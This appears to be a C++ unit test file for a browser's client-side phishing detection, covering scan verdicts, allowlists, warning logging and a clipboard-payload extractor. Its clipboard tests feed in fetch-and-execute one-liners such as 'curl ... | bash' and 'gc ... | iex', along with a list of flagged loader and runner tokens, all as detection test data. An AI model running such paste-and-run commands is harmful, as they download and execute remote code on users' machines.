TEST_F(ClientSideDetectionHostBaseTest, OnIntelligentScanDoneSuccess) {
  base::HistogramTester histograms;
  GURL url("https://example.com/");
  auto verdict = std::make_unique<ClientPhishingRequest>();
  verdict->set_url(url.spec());
  verdict->set_client_side_detection_type(TRIGGER_MODELS);

  IntelligentScanDelegate::IntelligentScanResult response;
  response.execution_success = true;
  response.model_version = 42;
  response.model_type = IntelligentScanDelegate::ModelType::kOnDevice;
  response.brand = "ExampleBrand";
  response.intent = "Phishing";

  MockClientSideDetectionServiceBase mock_csd_service;
  host_ = std::make_unique<TestClientSideDetectionHostBase>(
      cache_manager_.get(), &prefs_, /*history_service=*/nullptr,
      mock_csd_service.GetWeakPtr(), /*is_off_the_record=*/false);
  host_->set_current_url(url);

  // Ensure CanGetAccessToken returns false to avoid needing mock TokenFetcher.
  SetEnhancedProtectionPrefForTests(&prefs_, false);

  EXPECT_CALL(mock_csd_service, SendClientReportPhishingRequest(_, _, _))
      .WillOnce([&](std::unique_ptr<ClientPhishingRequest> sent_verdict,
                    ClientSideDetectionServiceBase::
                        ClientReportPhishingRequestCallback callback,
                    const std::string& access_token) {
        ASSERT_TRUE(sent_verdict->has_intelligent_scan_info());
        const auto& info = sent_verdict->intelligent_scan_info();
        EXPECT_EQ(info.brand(), "ExampleBrand");
        EXPECT_EQ(info.intent(), "Phishing");
        EXPECT_EQ(info.model_version(), 42);
        EXPECT_EQ(info.model_type(), IntelligentScanModelType::ON_DEVICE_MODEL);
      });

  host_->OnIntelligentScanDone(std::move(verdict),
                               /*did_match_high_confidence_allowlist=*/false,
                               /*is_invalid_ip=*/false, response);

  histograms.ExpectUniqueSample(
      "SBClientPhishing.IntelligentScanHasSuccessfulResponse", true, 1);
}

TEST_F(ClientSideDetectionHostBaseTest, OnIntelligentScanDoneFailure) {
  GURL url("https://example.com/");
  host_->set_current_url(url);

  base::HistogramTester histograms;

  auto verdict = std::make_unique<ClientPhishingRequest>();
  verdict->set_url(url.spec());
  verdict->set_client_side_detection_type(TRIGGER_MODELS);

  IntelligentScanDelegate::IntelligentScanResult response;
  response.execution_success = false;
  response.model_version = 42;
  response.model_type = IntelligentScanDelegate::ModelType::kOnDevice;
  response.no_info_reason = IntelligentScanInfo::EMPTY_TEXT;

  // We need to use a mock service to avoid crashes in MaybeGetAccessToken if it
  // proceeds.
  MockClientSideDetectionServiceBase mock_csd_service;
  host_ = std::make_unique<TestClientSideDetectionHostBase>(
      cache_manager_.get(), &prefs_, /*history_service=*/nullptr,
      mock_csd_service.GetWeakPtr(), /*is_off_the_record=*/false);
  host_->set_current_url(url);

  // Ensure CanGetAccessToken returns false to avoid needing mock TokenFetcher.
  SetEnhancedProtectionPrefForTests(&prefs_, false);

  // Verify that model info was logged even though execution should fail.
  EXPECT_CALL(mock_csd_service, SendClientReportPhishingRequest(_, _, _))
      .WillOnce([&](std::unique_ptr<ClientPhishingRequest> sent_verdict,
                    ClientSideDetectionServiceBase::
                        ClientReportPhishingRequestCallback callback,
                    const std::string& access_token) {
        ASSERT_TRUE(sent_verdict->has_intelligent_scan_info());
        const auto& info = sent_verdict->intelligent_scan_info();
        EXPECT_EQ(info.model_version(), 42);
        EXPECT_EQ(info.model_type(), IntelligentScanModelType::ON_DEVICE_MODEL);
        EXPECT_EQ(info.no_info_reason(), IntelligentScanInfo::EMPTY_TEXT);
      });

  host_->OnIntelligentScanDone(std::move(verdict),
                               /*did_match_high_confidence_allowlist=*/false,
                               /*is_invalid_ip=*/false, response);

  histograms.ExpectUniqueSample(
      "SBClientPhishing.IntelligentScanHasSuccessfulResponse", false, 1);
}

TEST_F(ClientSideDetectionHostBaseTest, CanSendSamplePing) {
  // Enhanced protection disabled -> false regardless of request type or
  // sample rate.
  SetEnhancedProtectionPrefForTests(&prefs_, false);
  host_->set_sample_ping_rate_for_testing(1.0f);
  EXPECT_FALSE(
      host_->CanSendSamplePing(ClientSideDetectionType::TRIGGER_MODELS));

  // Enhanced protection enabled, TRIGGER_MODELS, and 1.0 sample ping rate ->
  // true.
  SetEnhancedProtectionPrefForTests(&prefs_, true);
  host_->set_sample_ping_rate_for_testing(1.0f);
  EXPECT_TRUE(
      host_->CanSendSamplePing(ClientSideDetectionType::TRIGGER_MODELS));

  // Enhanced protection enabled, TRIGGER_MODELS, but 0.0 sample ping rate ->
  // false.
  host_->set_sample_ping_rate_for_testing(0.0f);
  EXPECT_FALSE(
      host_->CanSendSamplePing(ClientSideDetectionType::TRIGGER_MODELS));

  // Non-trigger-models request type -> false even with 1.0 sample ping rate and
  // Enhanced protection enabled.
  host_->set_sample_ping_rate_for_testing(1.0f);
  EXPECT_FALSE(
      host_->CanSendSamplePing(ClientSideDetectionType::CLIPBOARD_COPY_API));
  EXPECT_FALSE(
      host_->CanSendSamplePing(ClientSideDetectionType::FORCE_REQUEST));
  EXPECT_FALSE(
      host_->CanSendSamplePing(ClientSideDetectionType::CREDIT_CARD_FORM));
  EXPECT_FALSE(host_->CanSendSamplePing(
      ClientSideDetectionType::CLIENT_SIDE_DETECTION_TYPE_UNSPECIFIED));
}

TEST_F(ClientSideDetectionHostBaseTest, ShouldAcceptHCAllowlist_TriggerModels) {
  // Not on allowlist -> false regardless of request type.
  EXPECT_FALSE(host_->ShouldAcceptHCAllowlist(
      ClientSideDetectionType::TRIGGER_MODELS,
      /*url_on_high_confidence_allowlist=*/false));

  // TRIGGER_MODELS with 1.0 acceptance rate -> true.
  host_->set_high_confidence_allowlist_acceptance_rate_for_testing(1.0f);
  EXPECT_TRUE(host_->ShouldAcceptHCAllowlist(
      ClientSideDetectionType::TRIGGER_MODELS,
      /*url_on_high_confidence_allowlist=*/true));

  // TRIGGER_MODELS with 0.0 acceptance rate -> false.
  host_->set_high_confidence_allowlist_acceptance_rate_for_testing(0.0f);
  EXPECT_FALSE(host_->ShouldAcceptHCAllowlist(
      ClientSideDetectionType::TRIGGER_MODELS,
      /*url_on_high_confidence_allowlist=*/true));

  // FORCE_REQUEST -> false.
  EXPECT_FALSE(host_->ShouldAcceptHCAllowlist(
      ClientSideDetectionType::FORCE_REQUEST,
      /*url_on_high_confidence_allowlist=*/true));
}

TEST_F(ClientSideDetectionHostBaseTest,
       ShouldAcceptHCAllowlist_ClipboardCopyApi) {
  // CLIPBOARD_COPY_API with feature acceptance rate 1.0 -> true.
  {
    base::test::ScopedFeatureList feature_list;
    feature_list.InitAndEnableFeatureWithParameters(
        kClientSideDetectionClipboardCopyApi,
        {{kCsdClipboardCopyApiHCAcceptanceRate.name, "1.0"}});
    EXPECT_TRUE(host_->ShouldAcceptHCAllowlist(
        ClientSideDetectionType::CLIPBOARD_COPY_API,
        /*url_on_high_confidence_allowlist=*/true));
  }

  // CLIPBOARD_COPY_API with feature acceptance rate 0.0 -> false.
  {
    base::test::ScopedFeatureList feature_list;
    feature_list.InitAndEnableFeatureWithParameters(
        kClientSideDetectionClipboardCopyApi,
        {{kCsdClipboardCopyApiHCAcceptanceRate.name, "0.0"}});
    EXPECT_FALSE(host_->ShouldAcceptHCAllowlist(
        ClientSideDetectionType::CLIPBOARD_COPY_API,
        /*url_on_high_confidence_allowlist=*/true));
  }
}

TEST_F(ClientSideDetectionHostBaseTest,
       ShouldAcceptHCAllowlist_CreditCardForm) {
  // CREDIT_CARD_FORM with feature acceptance rate 1.0 -> true.
  {
    base::test::ScopedFeatureList feature_list;
    feature_list.InitAndEnableFeatureWithParameters(
        kClientSideDetectionCreditCardForm,
        {{kCsdCreditCardFormHCAcceptanceRate.name, "1.0"}});
    EXPECT_TRUE(host_->ShouldAcceptHCAllowlist(
        ClientSideDetectionType::CREDIT_CARD_FORM,
        /*url_on_high_confidence_allowlist=*/true));
  }

  // CREDIT_CARD_FORM with feature acceptance rate 0.0 -> false.
  {
    base::test::ScopedFeatureList feature_list;
    feature_list.InitAndEnableFeatureWithParameters(
        kClientSideDetectionCreditCardForm,
        {{kCsdCreditCardFormHCAcceptanceRate.name, "0.0"}});
    EXPECT_FALSE(host_->ShouldAcceptHCAllowlist(
        ClientSideDetectionType::CREDIT_CARD_FORM,
        /*url_on_high_confidence_allowlist=*/true));
  }
}

TEST_F(ClientSideDetectionHostBaseTest,
       MaybeShowPhishingWarning_UnfamiliarLoginPage_LogsSiteEngagementScore) {
  base::HistogramTester histograms;
  GURL phishing_url("https://example.com/");

  host_->set_site_engagement_score(15.0);

  // When is_phishing is false.
  host_->CallMaybeShowPhishingWarning(
      /*is_from_cache=*/false, ClientSideDetectionType::UNFAMILIAR_LOGIN_PAGE,
      /*did_match_high_confidence_allowlist=*/std::nullopt, phishing_url,
      /*is_phishing=*/false,
      /*response_code=*/std::nullopt,
      /*intelligent_scan_verdict=*/std::nullopt);

  histograms.ExpectUniqueSample("SBClientPhishing.ServerModelDetectsPhishing",
                                false, 1);
  histograms.ExpectUniqueSample(
      "SBClientPhishing.ServerModelDetectsPhishing.UnfamiliarLoginPage", false,
      1);
  histograms.ExpectUniqueSample(
      "SBClientPhishing.UnfamiliarLoginPage.SiteEngagementScore.NotPhishing",
      15, 1);
  histograms.ExpectTotalCount(
      "SBClientPhishing.UnfamiliarLoginPage.SiteEngagementScore.Phishing", 0);

  // When is_phishing is true.
  EXPECT_CALL(*host_,
              ShowBlockingPage(phishing_url,
                               ClientSideDetectionType::UNFAMILIAR_LOGIN_PAGE,
                               _, /*is_phishing=*/true,
                               /*should_show_scam_warning=*/false))
      .Times(1);
  host_->CallMaybeShowPhishingWarning(
      /*is_from_cache=*/false, ClientSideDetectionType::UNFAMILIAR_LOGIN_PAGE,
      /*did_match_high_confidence_allowlist=*/std::nullopt, phishing_url,
      /*is_phishing=*/true,
      /*response_code=*/std::nullopt,
      /*intelligent_scan_verdict=*/std::nullopt);

  histograms.ExpectBucketCount("SBClientPhishing.ServerModelDetectsPhishing",
                               true, 1);
  histograms.ExpectBucketCount(
      "SBClientPhishing.ServerModelDetectsPhishing.UnfamiliarLoginPage", true,
      1);
  histograms.ExpectUniqueSample(
      "SBClientPhishing.UnfamiliarLoginPage.SiteEngagementScore.Phishing", 15,
      1);
}

TEST_F(ClientSideDetectionHostBaseTest,
       MaybeShowPhishingWarning_UnfamiliarLoginPage_FromCache_DoesNotLog) {
  base::HistogramTester histograms;
  GURL phishing_url("https://example.com/");
  host_->set_site_engagement_score(15.0);

  host_->CallMaybeShowPhishingWarning(
      /*is_from_cache=*/true, ClientSideDetectionType::UNFAMILIAR_LOGIN_PAGE,
      /*did_match_high_confidence_allowlist=*/std::nullopt, phishing_url,
      /*is_phishing=*/false,
      /*response_code=*/std::nullopt,
      /*intelligent_scan_verdict=*/std::nullopt);

  histograms.ExpectTotalCount(
      "SBClientPhishing.UnfamiliarLoginPage.SiteEngagementScore.NotPhishing",
      0);
  histograms.ExpectTotalCount(
      "SBClientPhishing.UnfamiliarLoginPage.SiteEngagementScore.Phishing", 0);
}

TEST_F(ClientSideDetectionHostBaseTest,
       MaybeShowPhishingWarning_OtherRequestType_DoesNotLogEngagementScore) {
  base::HistogramTester histograms;
  GURL phishing_url("https://example.com/");
  host_->set_site_engagement_score(15.0);

  host_->CallMaybeShowPhishingWarning(
      /*is_from_cache=*/false, ClientSideDetectionType::TRIGGER_MODELS,
      /*did_match_high_confidence_allowlist=*/std::nullopt, phishing_url,
      /*is_phishing=*/false,
      /*response_code=*/std::nullopt,
      /*intelligent_scan_verdict=*/std::nullopt);

  histograms.ExpectUniqueSample("SBClientPhishing.ServerModelDetectsPhishing",
                                false, 1);
  histograms.ExpectUniqueSample(
      "SBClientPhishing.ServerModelDetectsPhishing.TriggerModel", false, 1);
  histograms.ExpectTotalCount(
      "SBClientPhishing.UnfamiliarLoginPage.SiteEngagementScore.NotPhishing",
      0);
  histograms.ExpectTotalCount(
      "SBClientPhishing.UnfamiliarLoginPage.SiteEngagementScore.Phishing", 0);
}

TEST_F(ClientSideDetectionHostBaseTest,
       MaybeShowPhishingWarning_UnfamiliarLoginPage_NoScore_DoesNotLog) {
  base::HistogramTester histograms;
  GURL phishing_url("https://example.com/");
  host_->set_site_engagement_score(std::nullopt);

  host_->CallMaybeShowPhishingWarning(
      /*is_from_cache=*/false, ClientSideDetectionType::UNFAMILIAR_LOGIN_PAGE,
      /*did_match_high_confidence_allowlist=*/std::nullopt, phishing_url,
      /*is_phishing=*/false,
      /*response_code=*/std::nullopt,
      /*intelligent_scan_verdict=*/std::nullopt);

  histograms.ExpectTotalCount(
      "SBClientPhishing.ServerModelDetectsPhishing.UnfamiliarLoginPage.false",
      0);
  histograms.ExpectTotalCount(
      "SBClientPhishing.ServerModelDetectsPhishing.UnfamiliarLoginPage.true",
      0);
}

TEST_F(ClientSideDetectionHostBaseTest,
       MaybeShowPhishingWarning_LogsIntelligentScanVerdict) {
  SetSafeBrowsingState(&prefs_, SafeBrowsingState::ENHANCED_PROTECTION);
  base::HistogramTester histograms;
  GURL phishing_url("https://example.com/");

  host_->CallMaybeShowPhishingWarning(
      /*is_from_cache=*/false, ClientSideDetectionType::FORCE_REQUEST,
      /*did_match_high_confidence_allowlist=*/std::nullopt, phishing_url,
      /*is_phishing=*/false,
      /*response_code=*/std::nullopt,
      /*intelligent_scan_verdict=*/
      IntelligentScanVerdict::INTELLIGENT_SCAN_VERDICT_SAFE);

  histograms.ExpectUniqueSample(
      "SBClientPhishing.IntelligentScanVerdict",
      IntelligentScanVerdict::INTELLIGENT_SCAN_VERDICT_SAFE, 1);
  histograms.ExpectUniqueSample(
      "SBClientPhishing.IntelligentScanVerdict.ForceRequest",
      IntelligentScanVerdict::INTELLIGENT_SCAN_VERDICT_SAFE, 1);
}

TEST_F(
    ClientSideDetectionHostBaseTest,
    MaybeShowPhishingWarning_EnhancedProtectionDisabled_DoesNotLogIntelligentScanVerdict) {
  SetSafeBrowsingState(&prefs_, SafeBrowsingState::STANDARD_PROTECTION);
  base::HistogramTester histograms;
  GURL phishing_url("https://example.com/");

  host_->CallMaybeShowPhishingWarning(
      /*is_from_cache=*/false, ClientSideDetectionType::FORCE_REQUEST,
      /*did_match_high_confidence_allowlist=*/std::nullopt, phishing_url,
      /*is_phishing=*/false,
      /*response_code=*/std::nullopt,
      /*intelligent_scan_verdict=*/
      IntelligentScanVerdict::INTELLIGENT_SCAN_VERDICT_SAFE);

  histograms.ExpectTotalCount("SBClientPhishing.IntelligentScanVerdict", 0);
  histograms.ExpectTotalCount(
      "SBClientPhishing.IntelligentScanVerdict.ForceRequest", 0);
}

TEST_F(
    ClientSideDetectionHostBaseTest,
    MaybeShowPhishingWarning_NoIntelligentScanVerdict_DoesNotLogIntelligentScanVerdict) {
  SetSafeBrowsingState(&prefs_, SafeBrowsingState::ENHANCED_PROTECTION);
  base::HistogramTester histograms;
  GURL phishing_url("https://example.com/");

  host_->CallMaybeShowPhishingWarning(
      /*is_from_cache=*/false, ClientSideDetectionType::FORCE_REQUEST,
      /*did_match_high_confidence_allowlist=*/std::nullopt, phishing_url,
      /*is_phishing=*/false,
      /*response_code=*/std::nullopt,
      /*intelligent_scan_verdict=*/std::nullopt);

  histograms.ExpectTotalCount("SBClientPhishing.IntelligentScanVerdict", 0);
  histograms.ExpectTotalCount(
      "SBClientPhishing.IntelligentScanVerdict.ForceRequest", 0);
}

TEST_F(ClientSideDetectionHostBaseTest,
       ShouldCaptureScreenshotForIntelligentScan_FeatureDisabled) {
  base::test::ScopedFeatureList feature_list;
  feature_list.InitAndDisableFeature(kClientSideDetectionServerModelMultimodal);
  EXPECT_FALSE(host_->ShouldCaptureScreenshotForIntelligentScan());
}

TEST_F(ClientSideDetectionHostBaseTest,
       ShouldCaptureScreenshotForIntelligentScan_FeatureEnabled) {
  base::test::ScopedFeatureList feature_list;
  feature_list.InitAndEnableFeature(kClientSideDetectionServerModelMultimodal);
  EXPECT_TRUE(host_->ShouldCaptureScreenshotForIntelligentScan());
}

TEST_F(
    ClientSideDetectionHostBaseTest,
    ShouldCaptureScreenshotForIntelligentScan_LowEndDeviceExcludedByDefault) {
  base::test::ScopedCommandLine scoped_command_line;
  scoped_command_line.GetProcessCommandLine()->AppendSwitch(
      switches::kEnableLowEndDeviceMode);
  base::test::ScopedFeatureList feature_list;
  feature_list.InitAndEnableFeature(kClientSideDetectionServerModelMultimodal);
  EXPECT_FALSE(host_->ShouldCaptureScreenshotForIntelligentScan());
}

TEST_F(
    ClientSideDetectionHostBaseTest,
    ShouldCaptureScreenshotForIntelligentScan_LowEndDeviceAllowedWhenParamFalse) {
  base::test::ScopedCommandLine scoped_command_line;
  scoped_command_line.GetProcessCommandLine()->AppendSwitch(
      switches::kEnableLowEndDeviceMode);
  base::test::ScopedFeatureList feature_list;
  feature_list.InitAndEnableFeatureWithParameters(
      kClientSideDetectionServerModelMultimodal,
      {{kClientSideDetectionServerModelMultimodalExcludeLowEndDevices.name,
        "false"}});
  EXPECT_TRUE(host_->ShouldCaptureScreenshotForIntelligentScan());
}

TEST_F(ClientSideDetectionHostBaseTest,
       StartIntelligentScan_SkipsWhenBothInnerTextAndScreenshotAreEmpty) {
  GURL url("https://example.com/");
  auto verdict = std::make_unique<ClientPhishingRequest>();
  verdict->set_url(url.spec());
  verdict->set_client_side_detection_type(TRIGGER_MODELS);

  MockClientSideDetectionServiceBase mock_csd_service;
  MockIntelligentScanDelegate mock_intelligent_scan_delegate;
  host_ = std::make_unique<TestClientSideDetectionHostBase>(
      cache_manager_.get(), &prefs_, /*history_service=*/nullptr,
      mock_csd_service.GetWeakPtr(), /*is_off_the_record=*/false,
      &mock_intelligent_scan_delegate);
  host_->set_current_url(url);
  SetEnhancedProtectionPrefForTests(&prefs_, false);

  EXPECT_CALL(mock_intelligent_scan_delegate, StartIntelligentScan(_, _, _, _))
      .Times(0);
  EXPECT_CALL(mock_csd_service, SendClientReportPhishingRequest(_, _, _))
      .WillOnce([&](std::unique_ptr<ClientPhishingRequest> sent_verdict,
                    ClientSideDetectionServiceBase::
                        ClientReportPhishingRequestCallback callback,
                    const std::string& access_token) {
        ASSERT_TRUE(sent_verdict->has_intelligent_scan_info());
        EXPECT_EQ(sent_verdict->intelligent_scan_info().no_info_reason(),
                  IntelligentScanInfo::EMPTY_TEXT);
      });

  host_->StartIntelligentScan(std::move(verdict),
                              /*did_match_high_confidence_allowlist=*/false,
                              /*is_invalid_ip=*/false, /*inner_text=*/"",
                              /*tab_screenshot=*/std::nullopt);
}

TEST_F(ClientSideDetectionHostBaseTest,
       StartIntelligentScan_SkipsWhenInnerTextTooShortAndScreenshotEmpty) {
  GURL url("https://example.com/");
  auto verdict = std::make_unique<ClientPhishingRequest>();
  verdict->set_url(url.spec());
  verdict->set_client_side_detection_type(TRIGGER_MODELS);

  MockClientSideDetectionServiceBase mock_csd_service;
  MockIntelligentScanDelegate mock_intelligent_scan_delegate;
  host_ = std::make_unique<TestClientSideDetectionHostBase>(
      cache_manager_.get(), &prefs_, /*history_service=*/nullptr,
      mock_csd_service.GetWeakPtr(), /*is_off_the_record=*/false,
      &mock_intelligent_scan_delegate);
  host_->set_current_url(url);
  SetEnhancedProtectionPrefForTests(&prefs_, false);

  EXPECT_CALL(mock_intelligent_scan_delegate, StartIntelligentScan(_, _, _, _))
      .Times(0);
  EXPECT_CALL(mock_csd_service, SendClientReportPhishingRequest(_, _, _))
      .WillOnce([&](std::unique_ptr<ClientPhishingRequest> sent_verdict,
                    ClientSideDetectionServiceBase::
                        ClientReportPhishingRequestCallback callback,
                    const std::string& access_token) {
        ASSERT_TRUE(sent_verdict->has_intelligent_scan_info());
        EXPECT_EQ(sent_verdict->intelligent_scan_info().no_info_reason(),
                  IntelligentScanInfo::TEXT_TOO_SHORT);
      });

  host_->StartIntelligentScan(std::move(verdict),
                              /*did_match_high_confidence_allowlist=*/false,
                              /*is_invalid_ip=*/false, /*inner_text=*/"text",
                              /*tab_screenshot=*/"");
}

TEST_F(ClientSideDetectionHostBaseTest,
       StartIntelligentScan_ProceedsWhenInnerTextEmptyAndScreenshotPresent) {
  GURL url("https://example.com/");
  auto verdict = std::make_unique<ClientPhishingRequest>();
  verdict->set_url(url.spec());
  verdict->set_client_side_detection_type(TRIGGER_MODELS);

  MockClientSideDetectionServiceBase mock_csd_service;
  MockIntelligentScanDelegate mock_intelligent_scan_delegate;
  host_ = std::make_unique<TestClientSideDetectionHostBase>(
      cache_manager_.get(), &prefs_, /*history_service=*/nullptr,
      mock_csd_service.GetWeakPtr(), /*is_off_the_record=*/false,
      &mock_intelligent_scan_delegate);
  host_->set_current_url(url);

  EXPECT_CALL(
      mock_intelligent_scan_delegate,
      StartIntelligentScan("", url.spec(),
                           std::optional<std::string>("fake_png_bytes"), _))
      .WillOnce(Return(base::UnguessableToken::Create()));

  host_->StartIntelligentScan(std::move(verdict),
                              /*did_match_high_confidence_allowlist=*/false,
                              /*is_invalid_ip=*/false, /*inner_text=*/"",
                              /*tab_screenshot=*/"fake_png_bytes");
  EXPECT_EQ(host_->last_intelligent_scan_tab_screenshot_for_testing(),
            "fake_png_bytes");
}

TEST_F(ClientSideDetectionHostBaseTest,
       StartIntelligentScan_ProceedsWhenInnerTextTooShortAndScreenshotPresent) {
  GURL url("https://example.com/");
  auto verdict = std::make_unique<ClientPhishingRequest>();
  verdict->set_url(url.spec());
  verdict->set_client_side_detection_type(TRIGGER_MODELS);

  MockClientSideDetectionServiceBase mock_csd_service;
  MockIntelligentScanDelegate mock_intelligent_scan_delegate;
  host_ = std::make_unique<TestClientSideDetectionHostBase>(
      cache_manager_.get(), &prefs_, /*history_service=*/nullptr,
      mock_csd_service.GetWeakPtr(), /*is_off_the_record=*/false,
      &mock_intelligent_scan_delegate);
  host_->set_current_url(url);

  EXPECT_CALL(
      mock_intelligent_scan_delegate,
      StartIntelligentScan("text", url.spec(),
                           std::optional<std::string>("fake_png_bytes"), _))
      .WillOnce(Return(base::UnguessableToken::Create()));

  host_->StartIntelligentScan(std::move(verdict),
                              /*did_match_high_confidence_allowlist=*/false,
                              /*is_invalid_ip=*/false, /*inner_text=*/"text",
                              /*tab_screenshot=*/"fake_png_bytes");
  EXPECT_EQ(host_->last_intelligent_scan_tab_screenshot_for_testing(),
            "fake_png_bytes");
}

// Unit tests for ExtractClipboardData
class ClientSideDetectionHostBaseClipboardDataTest
    : public ClientSideDetectionHostBaseTest {
 public:
  ClipboardExtractedData ExtractFromPayload(const std::u16string& payload) {
    return host_->ExtractClipboardData(payload);
  }
};

TEST_F(ClientSideDetectionHostBaseClipboardDataTest, EmptyPayload) {
  ClipboardExtractedData data = ExtractFromPayload(u"");
  EXPECT_EQ(0, data.suspicious_tokens_size());
  EXPECT_FALSE(data.is_first_token_suspicious());
  EXPECT_FALSE(data.is_last_token_suspicious());
}

TEST_F(ClientSideDetectionHostBaseClipboardDataTest, NoSusCommands) {
  ClipboardExtractedData data = ExtractFromPayload(u"this is a normal string");
  EXPECT_EQ(0, data.suspicious_tokens_size());
  EXPECT_FALSE(data.is_first_token_suspicious());
  EXPECT_FALSE(data.is_last_token_suspicious());
  EXPECT_FALSE(data.is_overall_suspicious());
}

TEST_F(ClientSideDetectionHostBaseClipboardDataTest,
       SingleSusCommandAtBeginning) {
  ClipboardExtractedData data = ExtractFromPayload(u"curl example.com");
  EXPECT_THAT(data.suspicious_tokens(), ::testing::ElementsAre("curl"));
  EXPECT_TRUE(data.is_first_token_suspicious());
  EXPECT_FALSE(data.is_last_token_suspicious());
  EXPECT_FALSE(data.is_overall_suspicious());
}

TEST_F(ClientSideDetectionHostBaseClipboardDataTest, SingleSusCommandAtEnd) {
  ClipboardExtractedData data = ExtractFromPayload(u"some text with wget");
  EXPECT_THAT(data.suspicious_tokens(), ::testing::ElementsAre("wget"));
  EXPECT_FALSE(data.is_first_token_suspicious());
  EXPECT_TRUE(data.is_last_token_suspicious());
  EXPECT_FALSE(data.is_overall_suspicious());
}

TEST_F(ClientSideDetectionHostBaseClipboardDataTest, SuspiciousCommand) {
  ClipboardExtractedData data =
      ExtractFromPayload(u"curl https://example.com/s.sh | bash");
  EXPECT_THAT(data.suspicious_tokens(), ::testing::ElementsAre("curl", "bash"));
  EXPECT_TRUE(data.is_first_token_suspicious());
  EXPECT_TRUE(data.is_last_token_suspicious());
  EXPECT_EQ(data.payload_length(), 36);
  EXPECT_EQ(data.total_parsed_tokens(), 3);
  EXPECT_EQ(data.urls_size(), 1);
  EXPECT_TRUE(data.is_overall_suspicious());
}

TEST_F(ClientSideDetectionHostBaseClipboardDataTest, MissingRunner) {
  // Loader + URL, but no runner.
  ClipboardExtractedData data = ExtractFromPayload(u"curl https://example.com");
  EXPECT_EQ(1, data.suspicious_tokens_size());
  EXPECT_FALSE(data.is_overall_suspicious());
}

TEST_F(ClientSideDetectionHostBaseClipboardDataTest, MissingURL) {
  // Loader + Runner, but no URL.
  ClipboardExtractedData data = ExtractFromPayload(u"echo hello | bash");
  EXPECT_THAT(data.suspicious_tokens(), ::testing::ElementsAre("echo", "bash"));
  EXPECT_TRUE(data.is_first_token_suspicious());
  EXPECT_TRUE(data.is_last_token_suspicious());
  EXPECT_FALSE(data.is_overall_suspicious());
}

TEST_F(ClientSideDetectionHostBaseClipboardDataTest, RemoteRunner) {
  // Remote runner satisfies loader and runner.
  ClipboardExtractedData data = ExtractFromPayload(u"mshta example.com");
  EXPECT_THAT(data.suspicious_tokens(), ::testing::ElementsAre("mshta"));
  EXPECT_TRUE(data.is_first_token_suspicious());
  EXPECT_EQ(data.urls_size(), 1);
  EXPECT_TRUE(data.is_overall_suspicious());
}

TEST_F(ClientSideDetectionHostBaseClipboardDataTest, SubcommandSyntax) {
  // Subcommand syntax satisfies runner.
  ClipboardExtractedData data =
      ExtractFromPayload(u"$(curl http://example.com)");
  EXPECT_THAT(data.suspicious_tokens(), ::testing::ElementsAre("curl"));
  EXPECT_EQ(data.urls_size(), 1);
  EXPECT_TRUE(data.is_overall_suspicious());
}

TEST_F(ClientSideDetectionHostBaseClipboardDataTest, MixedCaseAndPaths) {
  ClipboardExtractedData data =
      ExtractFromPayload(u"cUrL https://example.com/s /usr/bin/BaSh.exe");
  EXPECT_THAT(data.suspicious_tokens(), ::testing::ElementsAre("curl", "bash"));
  EXPECT_TRUE(data.is_first_token_suspicious());
  EXPECT_TRUE(data.is_last_token_suspicious());
  EXPECT_TRUE(data.is_overall_suspicious());
}

TEST_F(ClientSideDetectionHostBaseClipboardDataTest, MixedDelimiters) {
  ClipboardExtractedData data = ExtractFromPayload(
      u"\"curl\"\thttps://e.com\rwget\nhttp://b.com|{bash};(cmd::iex)");
  EXPECT_THAT(data.suspicious_tokens(),
              ::testing::ElementsAre("curl", "wget", "bash", "cmd", "iex"));
  EXPECT_TRUE(data.is_first_token_suspicious());
  EXPECT_TRUE(data.is_last_token_suspicious());
  EXPECT_TRUE(data.is_overall_suspicious());
}

TEST_F(ClientSideDetectionHostBaseClipboardDataTest, QuoteDelimiter) {
  ClipboardExtractedData data =
      ExtractFromPayload(u"\"curl\" \"https://example.com/s.sh\" \"bash\"");
  EXPECT_THAT(data.suspicious_tokens(), ::testing::ElementsAre("curl", "bash"));
  EXPECT_TRUE(data.is_first_token_suspicious());
  EXPECT_TRUE(data.is_last_token_suspicious());
  EXPECT_EQ(data.urls_size(), 1);
  EXPECT_TRUE(data.is_overall_suspicious());
}

TEST_F(ClientSideDetectionHostBaseClipboardDataTest, GcLoader) {
  ClipboardExtractedData data =
      ExtractFromPayload(u"gc https://example.com | iex");
  EXPECT_THAT(data.suspicious_tokens(), ::testing::ElementsAre("gc", "iex"));
  EXPECT_TRUE(data.is_first_token_suspicious());
  EXPECT_TRUE(data.is_last_token_suspicious());
  EXPECT_EQ(data.urls_size(), 1);
  EXPECT_TRUE(data.is_overall_suspicious());
}

TEST_F(ClientSideDetectionHostBaseClipboardDataTest, LocalAppDataEndpoint) {
  ClipboardExtractedData data = ExtractFromPayload(u"gc %LOCALAPPDATA% | iex");
  EXPECT_THAT(data.suspicious_tokens(), ::testing::ElementsAre("gc", "iex"));
  EXPECT_TRUE(data.is_first_token_suspicious());
  EXPECT_TRUE(data.is_last_token_suspicious());
  EXPECT_THAT(data.urls(), ::testing::ElementsAre("%localappdata%"));
  EXPECT_TRUE(data.is_overall_suspicious());

  ClipboardExtractedData quoted_mixed_case =
      ExtractFromPayload(u"gc \"%LocalAppData%\" | iex");
  EXPECT_THAT(quoted_mixed_case.suspicious_tokens(),
              ::testing::ElementsAre("gc", "iex"));
  EXPECT_THAT(quoted_mixed_case.urls(),
              ::testing::ElementsAre("%localappdata%"));
  EXPECT_TRUE(quoted_mixed_case.is_overall_suspicious());
}

TEST_F(ClientSideDetectionHostBaseClipboardDataTest, UserProfileEndpoint) {
  ClipboardExtractedData data = ExtractFromPayload(u"gc %USERPROFILE% | iex");
  EXPECT_THAT(data.suspicious_tokens(), ::testing::ElementsAre("gc", "iex"));
  EXPECT_TRUE(data.is_first_token_suspicious());
  EXPECT_TRUE(data.is_last_token_suspicious());
  EXPECT_THAT(data.urls(), ::testing::ElementsAre("%userprofile%"));
  EXPECT_TRUE(data.is_overall_suspicious());

  ClipboardExtractedData quoted_mixed_case =
      ExtractFromPayload(u"gc \"%UserProfile%\" | iex");
  EXPECT_THAT(quoted_mixed_case.suspicious_tokens(),
              ::testing::ElementsAre("gc", "iex"));
  EXPECT_THAT(quoted_mixed_case.urls(),
              ::testing::ElementsAre("%userprofile%"));
  EXPECT_TRUE(quoted_mixed_case.is_overall_suspicious());
}

TEST_F(ClientSideDetectionHostBaseClipboardDataTest, IncludeFullPayload) {
  feature_list_.InitAndEnableFeatureWithParameters(
      kClientSideDetectionClipboardCopyApi, {{"IncludeFullPayload", "true"}});

  ClipboardExtractedData data =
      ExtractFromPayload(u"curl https://example.com/s.sh | bash");
